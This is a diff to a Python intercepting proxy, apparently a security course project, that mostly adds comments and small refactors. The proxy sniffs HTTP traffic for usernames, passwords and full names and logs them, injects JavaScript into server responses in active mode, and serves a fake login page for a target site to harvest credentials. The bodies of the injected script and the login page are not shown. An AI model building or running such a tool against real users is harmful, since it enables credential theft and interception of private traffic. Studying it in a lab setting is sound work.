@@ -14,7 +14,9 @@ from urllib.parse import unquote
 
 args = None
 file_lock = threading.Lock()
+# the url for which a phished login screen will be returned
 target_url = "example.com"
+# the US top 100 names from 2011 for both male and female
 top_names = [
     "Jacob",
     "Isabella",
@@ -217,6 +219,9 @@ top_names = [
     "Bentley",
     "Paige",
 ]
+# Build the regex pattern for the names
+names_pattern = "|".join(re.escape(name) for name in top_names)
+# patterns to search for in the packets
 passive_patterns = {
     "username": re.compile(r"\buser(?:name)?=(.*?)(?:&|$)"),
     "password": re.compile(r"(?:password|pwd|pass)=(.*?)(?:&|$)"),
@@ -254,8 +259,8 @@ def get_args():
     parser.add_argument("port", help="The port of the proxy")
     args = parser.parse_args()
 
-
-def test_patterns(query_string, patterns: dict[str, re.Pattern]):
+# each regex is tested and the result appended to a dictionary based on the element it was looking for
+def test_patterns(query_string, patterns: dict[str, re.Pattern]) -> dict[str, str]:
     results = {}
     for key, pattern in patterns.items():
         matches = pattern.findall(query_string)
@@ -267,17 +272,9 @@ def test_patterns(query_string, patterns: dict[str, re.Pattern]):
         results[key] = matches
     return results
 
-
-def find_common_names_with_context(text, names, context_size=2):
-    # Escape names for regex and join them with '|'
-    names_pattern = "|".join(re.escape(name) for name in names)
-
-    # Pattern to match a word. Adjust as needed (e.g., to handle hyphens, apostrophes)
-    word_pattern = r"\b\w+\b"
-
-    # Create a regex pattern to find a word, then a name, then another word
-    # This includes 'context_size' words before and after the name
-    pattern = rf"((?:{word_pattern}\W+){{0,{context_size}}})\b({names_pattern})\b((?:\W+{word_pattern}){{0,{context_size}}})"
+# finds the name in the packet and return the name and the words around it to hopefully obtain a full name
+def find_common_names_with_context(text, context_size=2) -> list[str]:
+    pattern = rf"((?:\b\w+\b\W+){{0,{context_size}}})\b({names_pattern})\b((?:\W+\b\w+\b){{0,{context_size}}})"
 
     name_regex = re.compile(pattern, re.IGNORECASE)
 
@@ -291,13 +288,16 @@ def find_common_names_with_context(text, names, context_size=2):
 
     return results
 
-
+# passive mode, search the packet looking for the patterns defined above
 def passive(data: str, url: str):
-    # Test the patterns
-    results = test_patterns(unquote(data), passive_patterns)
-    names = find_common_names_with_context(unquote(data), top_names)
+    # Remove any encoding done by the browser
+    packet = unquote(data)
 
-    # Print the results
+    # Test the patterns
+    results = test_patterns(packet, passive_patterns)
+    names = find_common_names_with_context(packet)
+
+    # Log the results to a file, concurrent access to the file is handled by a lock
     with file_lock:
         with open("info_1.txt", "a") as f:
             f.write(f"URL: {url}\n")
@@ -311,10 +311,8 @@ def passive(data: str, url: str):
 
             f.write("\n")
 
-
+# active mode, inject the javascript into the packet
 def active(body: str) -> str:
-    global args
-
     func = """
     <script>
     (function() {{
@@ -346,7 +344,7 @@ def active(body: str) -> str:
 
     return body
 
-
+# from the url get the domain and port to initialize the socket
 def get_server_port(url: str) -> (str, int):
     pattern = re.compile(r"([a-zA-Z0-9.-]+)(?::(\d+))?")
     match = pattern.match(url)
@@ -358,7 +356,7 @@ def get_server_port(url: str) -> (str, int):
     else:
         return None, None
 
-
+# obtain the encoding from the header and decompress the body
 def decode_body(header: str, body: bytes) -> (str, str):
     encoding = get_encoding(header)
 
@@ -372,16 +370,14 @@ def decode_body(header: str, body: bytes) -> (str, str):
         print("[*] Decompressing brotli")
         return (brotli.decompress(body).decode("utf-8"), encoding)
     else:
-        print("[*] No encoding found")
-
         try:
-            return (body.decode("utf-8"), None)
+            return (body.decode("utf-8"), "utf-8")
         except UnicodeDecodeError:
             print("[*] Could not decode response")
 
     return ("", None)
 
-
+# compress the body based on the encoding
 def encode_body(body: str, encoding: str) -> bytes:
     injected = body.encode("utf-8")
 
@@ -394,8 +390,8 @@ def encode_body(body: str, encoding: str) -> bytes:
 
     return injected
 
-
-def get_data(socket: socket):
+# get the data from the socket
+def get_data(socket: socket) -> bytes:
     data = b""
 
     while True:
@@ -407,7 +403,7 @@ def get_data(socket: socket):
 
     return data
 
-
+# get the body from the socket based on the length found in the header
 def get_body(socket: socket, length: int, _body=b"") -> bytes:
     body = _body
 
@@ -421,7 +417,7 @@ def get_body(socket: socket, length: int, _body=b"") -> bytes:
 
     return body
 
-
+# get the encoding from the header
 def get_encoding(http: str) -> str:
     pattern = re.compile(r"Content-Encoding:\s*([a-zA-Z0-9-]+)")
 
@@ -433,7 +429,7 @@ def get_encoding(http: str) -> str:
 
     return None
 
-
+# get the url from the header
 def get_url(req: str) -> str:
     match = re.search(r"^Host:\s*(.+)$", req, re.MULTILINE)
 
@@ -442,7 +438,7 @@ def get_url(req: str) -> str:
 
     return None
 
-
+# extract the information from the packet, for phishing and fingerprinting
 def extract_info(req: str) -> dict[str, str]:
     patterns = {
         "user-agent": re.compile(r"user-agent=(.*?)(?:&|$|\s)"),
@@ -455,7 +451,7 @@ def extract_info(req: str) -> dict[str, str]:
     # Test the patterns
     return test_patterns(req, patterns)
 
-
+# log the information obtained from phishing and fingerprinting to a log file
 def log_query(query: dict[str, str], msg: str):
     with file_lock:
         with open("info_2.txt", "a") as f:
@@ -467,7 +463,7 @@ def log_query(query: dict[str, str], msg: str):
 
             f.write("\n")
 
-
+# create the fake headers for the phishing page
 def get_fake_headers(body_length: int) -> bytes:
     utc_time = datetime.datetime.utcnow()
 
@@ -486,13 +482,23 @@ def get_fake_headers(body_length: int) -> bytes:
 
     return headers
 
-
+# create the page presented on successful phishing
 def get_phishing_response() -> bytes:
     body = """
         <!DOCTYPE html>
         <html>
         <head>
             <title>Phishing Page</title>
+            <style>
+                body {
+                    font-family: Arial, sans-serif;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    height: 100vh;
+                    background-color: #f2f2f2;
+                }
+            </style>
         </head>
         <body>
             <h1>U G0T Ph1Sh3d</h1>
@@ -506,7 +512,7 @@ def get_phishing_response() -> bytes:
 
     return headers + b"\r\n\r\n" + body
 
-
+# create the fake login page
 def get_fake_login() -> bytes:
     global args
 
@@ -583,11 +589,11 @@ def get_fake_login() -> bytes:
 
     return headers + b"\r\n\r\n" + body
 
-
+# get the HTPP method from the header
 def get_method(req: str) -> str:
     return req.split("\r\n")[0].split(" ")[0]
 
-
+# get the content length from the header
 def get_content_length(req: str) -> int:
     match = re.search(r"Content-Length:\s*(\d+)", req)
 
@@ -596,7 +602,8 @@ def get_content_length(req: str) -> int:
 
     return 0
 
-
+# handle the client connection, receiving and sending data back and forth between the client and the server
+# while depeding on the mode either passively or actively logging the information
 def handle_client(client_sock: socket, passive_mode: bool):
     try:
         while True:
@@ -690,18 +697,19 @@ def handle_client(client_sock: socket, passive_mode: bool):
             if passive_mode:
                 passive(headers + "\r\n" + body, url)
             else:
-                if method == "POST" or method == "GET":
-                    injected = encode_body(active(body), encoding)
+                if encoding != None:
+                    if method == "POST" or method == "GET":
+                        injected = encode_body(active(body), encoding)
 
-                    response_data = (
-                        re.sub(
-                            r"Content-Length: \d+",
-                            f"Content-Length: {len(injected)}",
-                            headers,
-                        ).encode("utf-8")
-                        + b"\r\n\r\n"
-                        + injected
-                    )
+                        response_data = (
+                            re.sub(
+                                r"Content-Length: \d+",
+                                f"Content-Length: {len(injected)}",
+                                headers,
+                            ).encode("utf-8")
+                            + b"\r\n\r\n"
+                            + injected
+                        )
 
             client_sock.sendall(response_data)
     except Exception as e:
@@ -715,6 +723,7 @@ def main():
 
     get_args()
 
+    # if the mode is not defined the proxy will run in passive mode by default
     if args.mode:
         if args.mode == "passive" or args.mode == "active":
             print(f"[*] Running in {args.mode} mode")
@@ -743,6 +752,7 @@ def main():
 
                 print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
 
+                # Handle the client connection in a separate thread
                 executor.submit(
                     handle_client, client_sock, False if args.mode == "active" else True
                 )
